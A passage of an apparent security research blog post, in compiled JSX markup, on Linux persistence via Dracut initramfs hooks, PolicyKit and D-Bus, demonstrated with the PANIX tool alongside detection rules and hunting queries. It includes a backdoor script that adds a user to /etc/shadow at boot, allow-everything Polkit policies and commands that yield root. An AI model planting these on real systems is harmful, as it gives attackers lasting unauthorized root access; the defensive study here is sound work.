\",(0,i.jsx)(e.code,{children:\"udev\"}),\").\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.code,{children:\"install()\"}),\": Defines what files or scripts to include. Functions like \",(0,i.jsx)(e.code,{children:\"inst_hook\"}),\" and \",(0,i.jsx)(e.code,{children:\"inst_simple\"}),\" simplify the process.\"]}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:\"Using Dracut, attackers or administrators can easily modify initramfs to include custom scripts or functionality. For example, a malicious actor might:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:\"Add a script that executes commands on boot.\"}),`\n`,(0,i.jsx)(e.li,{children:\"Alter existing modules to modify system behavior before the root filesystem is mounted.\"}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:\"In the next section, we\\u2019ll walk through creating a custom Dracut module to modify initramfs.\"}),`\n`,(0,i.jsx)(e.h1,{id:\"persistence-through-t1542---initramfs-modifying-with-dracut\",children:\"Persistence through T1542 - Initramfs: Modifying with Dracut\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"It is always a great idea to walk before we run. In the previous section we learnt how to manipulate initramfs manually, which can be difficult to set up. Now that we understand the basics, we can persist much easier by using a helper tool called Dracut, which is available by default on many Linux systems. Let\\u2019s take a look at the \",(0,i.jsx)(e.a,{href:\"https://github.com/Aegrah/PANIX/blob/7e27768807e12d11932e2fca5b6a4867308295dd/modules/setup_initramfs.sh\",rel:\"nofollow\",children:\"setup_initramfs.sh\"}),\" module again, but this time with a focus on the Dracut section.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"This PANIX module creates a new Dracut module directory at \",(0,i.jsx)(e.code,{children:\"/usr/lib/dracut/modules.d/99panix\"}),\", and creates a \",(0,i.jsx)(e.code,{children:\"module-setup.sh\"}),\" file with the following contents:\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`#!/bin/bash\ncheck()  { return 0; }\ndepends() { return 0; }\ninstall() {\n\tinst_hook pre-pivot 99 \"$moddir/backdoor-user.sh\"\n}\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"This script ensures that when the initramfs is built using Dracut, the custom script (\",(0,i.jsx)(e.code,{children:\"backdoor-user.sh\"}),\") is embedded and configured to execute at the pre-pivot stage during boot. By running at the pre-pivot stage, the script executes before control is handed over to the main OS, ensuring it can make modifications to the real root filesystem.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"After granting \",(0,i.jsx)(e.code,{children:\"module-setup.sh\"}),\" execution permissions, the module continues to create the \",(0,i.jsx)(e.code,{children:\"backdoor-user.sh\"}),\" file. To view the full content, inspect the module source code. The important parts are:\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`#!/bin/sh\n\n# Remount the real root if it's read-only\nmount -o remount,rw /sysroot 2\u003e/dev/null || {\n\techo \"[dracut] Could not remount /sysroot as RW. Exiting.\"\n\texit 1\n}\n[...]\n\nif check_user_exists \"\\${username}\" /sysroot/etc/shadow; then\n    echo \"[dracut] User '\\${username}' already exists in /etc/shadow.\"\nelse\n    echo \"\\${username}:\\${escaped_hash}:19000:0:99999:7:::\" \u003e\u003e /sysroot/etc/shadow\n    echo \"[dracut] Added '\\${username}' to /etc/shadow.\"\nfi\n\n[...]\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"First, the script ensures that the root filesystem (\",(0,i.jsx)(e.code,{children:\"/sysroot\"}),\") is writable. If this check completes, the script continues to add a new user by manually modifying the \",(0,i.jsx)(e.code,{children:\"/etc/shadow\"}),\", \",(0,i.jsx)(e.code,{children:\"/etc/passwd\"}),\" and \",(0,i.jsx)(e.code,{children:\"/etc/group\"}),\" files. The most important thing to notice is that these scripts rely on built-in shell utilities, as utilities such as \",(0,i.jsx)(e.code,{children:\"grep\"}),\" or \",(0,i.jsx)(e.code,{children:\"sed\"}),\" are not available in this environment. After writing the script, it is granted execution permissions and is good to go.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"Finally, Dracut is called to rebuild initramfs for the kernel version that is currently active:\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.code,{children:\"dracut --force /boot/initrd.img-$(uname -r) $(uname -r)\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"Once this step completes, the modified initramfs is active, and rebooting the machine will result in the \",(0,i.jsx)(e.code,{children:\"backdoor-user.sh\"}),\" script being executed.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"As always, first we take a snapshot, then we run the module:\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`\u003e sudo ./panix.sh --initramfs --dracut --username panix --password secret --snapshot yes\n[!] Will inject user 'panix' with hashed password \u003chash\u003e into the initramfs.\n[!] Preparing Dracut-based initramfs persistence...\n[+] Created dracut module setup script at /usr/lib/dracut/modules.d/99panix/module-setup.sh\n[+] Created dracut helper script at /usr/lib/dracut/modules.d/99panix/backdoor-user.sh\n[*] Rebuilding initramfs with dracut...\n[...]\ndracut: *** Including module: panix ***\n[...]\n[+] Dracut rebuild complete.\n[+] setup_initramfs module completed successfully.\n[!] Ensure you have a recent snapshot/backup of your system before proceeding.\n`})}),`\n`,(0,i.jsx)(e.p,{children:\"And take a look at the documents available in Discover:\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/the-grand-finale-on-linux-persistence/image5.png\",alt:\"PANIX Initramfs module execution visualized in Kibana - Dracut method\",width:\"1539\",height:\"1032\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"Upon execution, \",(0,i.jsx)(e.code,{children:\"openssl\"}),\" is used to create a password hash for the \",(0,i.jsx)(e.code,{children:\"secret\"}),\" password. Afterwards, the directory structure \",(0,i.jsx)(e.code,{children:\"/usr/lib/dracut/modules.d/99panix\"}),\" is created, and the \",(0,i.jsx)(e.code,{children:\"module-setup.sh\"}),\" and \",(0,i.jsx)(e.code,{children:\"backdoor-user.sh\"}),\" scripts are created and granted execution permissions. After regeneration of the initramfs completes, the backdoor has been planted, and will be active upon reboot.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"Let\\u2019s take a look at the coverage:\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.em,{children:\"Detection and endpoint rules that cover dracut initramfs persistence\"})}),`\n`,(0,i.jsx)(e.div,{className:\"table-container\",children:(0,i.jsxs)(e.table,{children:[(0,i.jsx)(e.thead,{children:(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.th,{align:\"left\",children:\"Category\"}),(0,i.jsx)(e.th,{align:\"left\",children:\"Coverage\"})]})}),(0,i.jsxs)(e.tbody,{children:[(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"File\"}),(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/cf183579b46dae3ebd294098b330341a98691fd0/rules/linux/persistence_dracut_module_creation.toml\",rel:\"nofollow\",children:\"Dracut Module Creation\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\"}),(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/2bb46899aea8571172687927b8084695bec44a62/rules/integrations/fim/persistence_suspicious_file_modifications.toml\",rel:\"nofollow\",children:\"Potential Persistence via File Modification\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"Process\"}),(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/cf183579b46dae3ebd294098b330341a98691fd0/rules/linux/persistence_manual_dracut_execution.toml\",rel:\"nofollow\",children:\"Manual Dracut Execution\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\"}),(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/3e655abfef5e6b9c759cc82fa225be48a90bbc24/rules/linux/persistence_openssl_passwd_hash_generation.toml\",rel:\"nofollow\",children:\"OpenSSL Password Hash Generation\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\"}),(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/2bb46899aea8571172687927b8084695bec44a62/rules/linux/persistence_potential_persistence_script_executable_bit_set.toml\",rel:\"nofollow\",children:\"Executable Bit Set for Potential Persistence Script\"})})]})]})]})}),`\n`,(0,i.jsx)(e.p,{children:\"You can revert the changes made by PANIX by running the following revert command:\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`\u003e ./panix.sh --revert initramfs\n\n[-] No backup initramfs found at /boot/initrd.img-5.15.0-130-generic.bak. Skipping restore.\n[!] Removing custom dracut module directory: /usr/lib/dracut/modules.d/99panix...\n[+] Custom dracut module directory removed.\n[!] Rebuilding initramfs to remove modifications...\n[...]\n[+] Initramfs rebuilt successfully.\n[!] Cleaning up temporary files...\n[+] Temporary files cleaned up.\n[+] Initramfs persistence reverted successfully.\n`})}),`\n`,(0,i.jsx)(e.h1,{id:\"hunting-for-t1542---initramfs-modifying-with-dracut\",children:\"Hunting for T1542 - Initramfs: Modifying with Dracut\"}),`\n`,(0,i.jsx)(e.p,{children:\"We can hunt for this technique using ES|QL and OSQuery by focusing on suspicious activity tied to the use of tools like Dracut. The approach includes monitoring for the following:\"}),`\n`,(0,i.jsxs)(e.ol,{children:[`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Execution of Dracut with Suspicious Arguments\"}),\": Tracks processes where Dracut is executed to regenerate or modify initramfs files, especially with non-standard arguments. This can help identify unauthorized attempts to modify initramfs.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Creations and/or Modifications to Dracut Modules\"}),\": Monitors changes within \",(0,i.jsx)(e.code,{children:\"/lib/dracut/modules.d/\"}),\" and \",(0,i.jsx)(e.code,{children:\"/usr/lib/dracut/modules.d/\"}),\", which store custom and system-wide Dracut modules. Unauthorized modifications here may indicate attempts to persist malicious functionality.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"General Kernel Manipulation Indicators\"}),\": Utilizes queries like monitoring \",(0,i.jsx)(e.code,{children:\"secureboot\"}),\", \",(0,i.jsx)(e.code,{children:\"kernel_info\"}),\", and file changes within \",(0,i.jsx)(e.code,{children:\"/boot/\"}),\" to detect broader signs of kernel and bootloader manipulation that could be related to Initramfs abuse.\"]}),`\n`]}),`\n`,(0,i.jsxs)(e.p,{children:[\"By combining the \",(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/1851ab91fdb84ac2c1fc9bf9d0663badadd0d0a7/hunting/linux/queries/persistence_via_initramfs.toml\",rel:\"nofollow\",children:\"Persistence via Initramfs\"}),\" and \",(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/1851ab91fdb84ac2c1fc9bf9d0663badadd0d0a7/hunting/linux/queries/persistence_general_kernel_manipulation.toml\",rel:\"nofollow\",children:\"General Kernel Manipulation\"}),\" hunting rules and the tailored detection queries listed above, you can effectively identify and respond to \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1542/\",rel:\"nofollow\",children:\"T1542\"}),\".\"]}),`\n`,(0,i.jsx)(e.h1,{id:\"t1543---create-or-modify-system-process-policykit\",children:\"T1543 - Create or Modify System Process: PolicyKit\"}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.a,{href:\"https://linux.die.net/man/8/polkit\",rel:\"nofollow\",children:\"PolicyKit (or Polkit)\"}),\" is a system service that provides an authorization framework for managing privileged actions in Linux systems. It enables fine-grained control over system-wide privileges, allowing non-privileged processes to interact with privileged ones securely. Acting as an intermediary between system services and users, Polkit determines whether a user is authorized to perform specific actions. For instance, it governs whether a user can restart network services or install software without requiring full sudo permissions.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"Polkit authorization is governed by rules, actions, and authorization policies:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Actions\"}),\": Defined in XML files (\",(0,i.jsx)(e.code,{children:\".policy\"}),\"), these specify the operations Polkit can manage, such as \",(0,i.jsx)(e.a,{href:\"https://www.freedesktop.org/software/systemd/man/latest/org.freedesktop.systemd1.html\",rel:\"nofollow\",children:(0,i.jsx)(e.code,{children:\"org.freedesktop.systemd1.manage-units\"})}),\".\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Rules\"}),\": JavaScript-like files (\",(0,i.jsx)(e.code,{children:\".rules\"}),\") determine how authorization is granted for specific actions. They can check user groups, environment variables, or other conditions.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Authorization Policies\"}),\": \",(0,i.jsx)(e.code,{children:\".pkla\"}),\" files set default or per-user/group authorizations for actions, determining whether authentication is required.\"]}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:\"The configuration files used by Polkit are found in several different locations, depending on the version of Polkit that is present on the system, and the Linux distribution that is active. The main locations you should know about:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsxs)(e.li,{children:[\"Action definitions:\",`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/usr/share/polkit-1/actions/\"})}),`\n`]}),`\n`]}),`\n`,(0,i.jsxs)(e.li,{children:[\"Rule definitions:\",`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/etc/polkit-1/rules.d/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/usr/share/polkit-1/rules.d/\"})}),`\n`]}),`\n`]}),`\n`,(0,i.jsxs)(e.li,{children:[\"Authorization definitions:\",`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/etc/polkit-1/localauthority/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/var/lib/polkit-1/localauthority/\"})}),`\n`]}),`\n`]}),`\n`]}),`\n`,(0,i.jsxs)(e.p,{children:[\"A Polkit \",(0,i.jsx)(e.code,{children:\".rules\"}),\" file defines the logic for granting or denying specific actions. These files provide flexibility in determining whether a user or process can execute an action. Here\\u2019s a simple example:\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`polkit.addRule(function(action, subject) {\n    if (action.id == \"org.freedesktop.systemd1.manage-units\" \u0026\u0026\n        subject.isInGroup(\"servicemanagers\")) {\n        return polkit.Result.YES;\n    }\n    return polkit.Result.NOT_HANDLED;\n});\n`})}),`\n`,(0,i.jsx)(e.p,{children:\"In this rule:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsxs)(e.li,{children:[\"The action \",(0,i.jsx)(e.code,{children:\"org.freedesktop.systemd1.manage-units\"}),\" (managing \",(0,i.jsx)(e.code,{children:\"systemd\"}),\" services) is granted to users in the \",(0,i.jsx)(e.code,{children:\"servicemanagers\"}),\" group.\"]}),`\n`,(0,i.jsx)(e.li,{children:\"Other actions fall back to default handling.\"}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:\"This structure allows administrators to implement custom policies, but it also opens the door for attackers who can insert overly permissive rules to gain unauthorized privileges.\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Currently, Polkit does not have a dedicated technique in the MITRE ATT\u0026CK framework. The closest match is \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1543/\",rel:\"nofollow\",children:\"T1543: Create or Modify System Process\"}),\", which describes adversaries modifying system-level processes to achieve persistence or privilege escalation.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"In the next section, we will explore step-by-step how attackers can craft and deploy malicious Polkit rules and authorization files, while also discussing detection and mitigation strategies.\"}),`\n`,(0,i.jsx)(e.h1,{id:\"persistence-through-t1543---create-or-modify-system-process-policykit\",children:\"Persistence through T1543 - Create or Modify System Process: PolicyKit\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Now that we understand the theory, let\\u2019s take a look at how to simulate this in practice through the \",(0,i.jsx)(e.a,{href:\"https://github.com/Aegrah/PANIX/blob/7e27768807e12d11932e2fca5b6a4867308295dd/modules/setup_polkit.sh\",rel:\"nofollow\",children:\"setup_polkit.sh\"}),\" PANIX module. First, the module checks the active Polkit version through the \",(0,i.jsx)(e.code,{children:\"pkaction --version\"}),\" command, as versions \u003c 0.106 use the older \",(0,i.jsx)(e.code,{children:\".pkla\"}),\" files, while newer versions (\u003e= 0.106) use the more recent \",(0,i.jsx)(e.code,{children:\".rules\"}),\" files. Depending on the version, the module will continue to create the Polkit policy that is overly permissive. For versions \u003c 0.106 a \",(0,i.jsx)(e.code,{children:\".pkla\"}),\" file is created in \",(0,i.jsx)(e.code,{children:\"/etc/polkit-1/localauthority/50-local.d/\"}),\":\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`mkdir -p /etc/polkit-1/localauthority/50-local.d/\n\n# Write the .pkla file\ncat \u003c\u003c-EOF \u003e /etc/polkit-1/localauthority/50-local.d/panix.pkla\n[Allow Everything]\nIdentity=unix-user:*\nAction=*\nResultAny=yes\nResultInactive=yes\nResultActive=yes\nEOF\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"Allowing any \",(0,i.jsx)(e.code,{children:\"unix-user\"}),\" to do any action through the \",(0,i.jsx)(e.code,{children:\"Identity=unix-user:*\"}),\" and \",(0,i.jsx)(e.code,{children:\"Action=*\"}),\" parameters.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"For versions \u003e= 0.106 a \",(0,i.jsx)(e.code,{children:\".rules\"}),\" file is created in \",(0,i.jsx)(e.code,{children:\"/etc/polkit-1/rules.d/\"}),\":\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`mkdir -p /etc/polkit-1/rules.d/\n\n# Write the .rules file\ncat \u003c\u003c-EOF \u003e /etc/polkit-1/rules.d/99-panix.rules\npolkit.addRule(function(action, subject) {\n\treturn polkit.Result.YES;\n});\nEOF\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"Where an overly permissive policy always returns \",(0,i.jsx)(e.code,{children:\"polkit.Result.YES\"}),\", which means that any action that requires Polkit\\u2019s authentication will be allowed by anyone.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"Polkit rules are processed in lexicographic (ASCII) order, meaning files with lower numbers load first, and later rules can override earlier ones. If two rules modify the same policy, the rule with the higher number takes precedence because it is evaluated last. To ensure the rule is executed and overrides others, PANIX creates it with a filename starting with 99 (e.g. \",(0,i.jsx)(e.code,{children:\"99-panix.rules\"}),\").\"]}),`\n`,(0,i.jsx)(e.p,{children:\"Let\\u2019s run the PANIX module with the following command line arguments:\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`\u003e sudo ./panix.sh --polkit\n\n[!] Polkit version \u003c 0.106 detected. Setting up persistence using .pkla files.\n[+] Persistence established via .pkla file.\n[+] Polkit service restarted.\n[!] Run pkexec su - to test the persistence.\n`})}),`\n`,(0,i.jsx)(e.p,{children:\"And take a look at the logs in Kibana:\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/the-grand-finale-on-linux-persistence/image2.png\",alt:\"PANIX Polkit module execution visualized in Kibana\",width:\"1765\",height:\"705\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"Upon execution of PANIX, we can see the \",(0,i.jsx)(e.code,{children:\"pkaction --version\"}),\" command being issued to determine whether a \",(0,i.jsx)(e.code,{children:\".pkla\"}),\" or \",(0,i.jsx)(e.code,{children:\".rules\"}),\" file approach is needed. After figuring this out, the correct policy is created, and the \",(0,i.jsx)(e.code,{children:\"polkit\"}),\" service is restarted (this is not always necessary however). Once these policies are in place, a user with a \",(0,i.jsx)(e.code,{children:\"user.Ext.real.id\"}),\" of \",(0,i.jsx)(e.code,{children:\"1000\"}),\" (not-root) is capable of obtaining root privileges by executing the \",(0,i.jsx)(e.code,{children:\"pkexec su -\"}),\" command.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"Let\\u2019s take a look at our detection opportunities:\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.em,{children:\"Detection and endpoint rules that cover Polkit persistence\"})}),`\n`,(0,i.jsx)(e.div,{className:\"table-container\",children:(0,i.jsxs)(e.table,{children:[(0,i.jsx)(e.thead,{children:(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.th,{align:\"left\",children:\"Category\"}),(0,i.jsx)(e.th,{align:\"left\",children:\"Coverage\"})]})}),(0,i.jsxs)(e.tbody,{children:[(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"File\"}),(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/cf183579b46dae3ebd294098b330341a98691fd0/rules/linux/persistence_polkit_policy_creation.toml\",rel:\"nofollow\",children:\"Polkit Policy Creation\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\"}),(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/integrations/fim/persistence_suspicious_file_modifications.toml\",rel:\"nofollow\",children:\"Potential Persistence via File Modification\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"Process\"}),(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/cf183579b46dae3ebd294098b330341a98691fd0/rules/linux/discovery_polkit_version_discovery.toml\",rel:\"nofollow\",children:\"Polkit Version Discovery\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\"}),(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/cf183579b46dae3ebd294098b330341a98691fd0/rules/linux/execution_unusual_pkexec_execution.toml\",rel:\"nofollow\",children:\"Unusual Pkexec Execution\"})})]})]})]})}),`\n`,(0,i.jsx)(e.p,{children:\"To revert any changes, you can use the corresponding revert module by running:\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`\u003e ./panix.sh --revert polkit\n\n[+] Checking for .pkla persistence file...\n[+] Removed file: /etc/polkit-1/localauthority/50-local.d/panix.pkla\n[+] Checking for .rules persistence file...\n[-] .rules file not found: /etc/polkit-1/rules.d/99-panix.rules\n[+] Restarting polkit service...\n[+] Polkit service restarted successfully.\n`})}),`\n`,(0,i.jsx)(e.h1,{id:\"hunting-for-t1543---create-or-modify-system-process-policykit\",children:\"Hunting for T1543 - Create or Modify System Process: PolicyKit\"}),`\n`,(0,i.jsx)(e.p,{children:\"We can hunt for this technique using ES|QL and OSQuery by focusing on suspicious activity tied to the modification of PolicyKit configuration files and rules. The approach includes hunting for the following:\"}),`\n`,(0,i.jsxs)(e.ol,{children:[`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Creations and/or Modifications to PolicyKit Configuration Files\"}),\": Tracks changes in critical directories containing custom and system-wide rules, action descriptions and authorizations rules. Monitoring these paths helps identify unauthorized additions or tampering that could indicate malicious activity.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Metadata Analysis of PolicyKit Files\"}),\": Inspects file ownership, access times, and modification timestamps for PolicyKit-related files. Unauthorized changes or files with unexpected ownership can indicate an attempt to persist or escalate privileges through PolicyKit.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Detection of Rare or Anomalous Events\"}),\": Identifies uncommon file modification or creation events by analyzing process execution and correlation with file activity. This helps surface subtle indicators of compromise.\"]}),`\n`]}),`\n`,(0,i.jsxs)(e.p,{children:[\"By combining the \",(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/1851ab91fdb84ac2c1fc9bf9d0663badadd0d0a7/hunting/linux/queries/persistence_via_policykit.toml\",rel:\"nofollow\",children:\"Persistence via PolicyKit\"}),\" hunting rule with the tailored detection queries listed above, analysts can effectively identify and respond to \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1543/\",rel:\"nofollow\",children:\"T1543\"}),\".\"]}),`\n`,(0,i.jsx)(e.h1,{id:\"t1543---create-or-modify-system-process-d-bus\",children:\"T1543 - Create or Modify System Process: D-Bus\"}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.a,{href:\"https://linux.die.net/man/1/dbus-daemon\",rel:\"nofollow\",children:\"D-Bus (Desktop Bus)\"}),\" is an \",(0,i.jsx)(e.a,{href:\"https://www.geeksforgeeks.org/inter-process-communication-ipc/\",rel:\"nofollow\",children:\"inter-process communication (IPC)\"}),\" system widely used in Linux and other Unix-like operating systems. It serves as a structured message bus, enabling processes, system services, and applications to communicate and coordinate actions. As a cornerstone of modern Linux environments, D-Bus provides the framework for both system-wide and user-specific communication.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"At its core, D-Bus facilitates interaction between processes by providing a standardized mechanism for sending and receiving messages, eliminating the need for custom IPC solutions while improving efficiency and security. It operates through two primary communication channels:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"System Bus\"}),\": Used for communication between system-level services and privileged operations, such as managing hardware or network configuration.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Session Bus\"}),\": Used for communication between user-level applications, such as desktop notifications or media players.\"]}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:\"A D-Bus daemon manages the message bus, ensuring messages are routed securely between processes. Processes register themselves on the bus with unique names and provide interfaces containing methods, signals, and properties for other processes to interact with. The core components of D-Bus communication looks as follows:\"}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.strong,{children:\"Interfaces\"}),\":\"]}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:\"Define a collection of methods, signals, and properties a service offers.\"}),`\n`,(0,i.jsxs)(e.li,{children:[\"Example: \",(0,i.jsx)(e.a,{href:\"https://networkmanager.dev/docs/api/latest/gdbus-org.freedesktop.NetworkManager.html\",rel:\"nofollow\",children:(0,i.jsx)(e.code,{children:\"org.freedesktop.NetworkManager\"})}),\" provides methods to manage network connections.\"]}),`\n`]}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.strong,{children:\"Methods\"}),\":\"]}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:\"Allow external processes to invoke specific actions or request information.\"}),`\n`,(0,i.jsxs)(e.li,{children:[\"Example: The method \",(0,i.jsx)(e.code,{children:\"org.freedesktop.NetworkManager.Reload\"}),\" can be called to reload a network service.\"]}),`\n`]}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.strong,{children:\"Signals\"}),\":\"]}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:\"Notifications sent by a service to inform other processes about events.\"}),`\n`,(0,i.jsx)(e.li,{children:\"Example: A signal might indicate a network connection status change.\"}),`\n`]}),`\n`,(0,i.jsxs)(e.p,{children:[\"As an example, the following command sends a message to the system bus to invoke the \",(0,i.jsx)(e.code,{children:\"Reload\"}),\" method on the \",(0,i.jsx)(e.code,{children:\"NetworkManager\"}),\" service:\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`dbus-send --system --dest=org.freedesktop.NetworkManager /org/freedesktop/NetworkManager org.freedesktop.NetworkManager.Reload uint32:0\n`})}),`\n`,(0,i.jsx)(e.p,{children:\"D-Bus services are applications or daemons that register themselves on the bus to provide functionality. If a requested service is not running, the D-Bus daemon can start it automatically using predefined service files.\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"These services use service files with a \",(0,i.jsx)(e.code,{children:\".service\"}),\" extension to tell D-Bus how to start a service. For example:\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`[D-BUS Service]\nName=org.freedesktop.MyService\nExec=/usr/bin/my-service\nUser=root\n`})}),`\n`,(0,i.jsx)(e.p,{children:\"D-Bus service files can be located in several different locations, depending on whether these services are running system-wide or at the user-level, and depending on the architecture and Linux distribution. The following is an overview of locations that are used, which is not an exhaustive list, as different distributions use different default locations:\"}),`\n`,(0,i.jsxs)(e.ol,{children:[`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"System-wide Configuration and Services\"}),\":\",`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsxs)(e.li,{children:[\"System service 